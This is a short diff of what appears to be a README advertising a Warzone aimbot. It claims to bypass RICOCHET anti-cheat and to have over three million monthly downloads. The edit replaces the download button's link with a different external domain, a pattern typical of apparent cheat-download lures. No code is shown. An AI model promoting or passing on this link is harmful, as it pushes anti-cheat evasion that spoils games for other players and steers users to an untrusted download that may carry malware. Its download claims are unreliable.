@@ -49,7 +49,7 @@ A: Yes — bypasses RICOCHET anti-cheat.
 
 **Monthly downloads:** 3.0m+
 
-[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/wzaimbot26)
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/wzaimbot26)
 
 ---
 
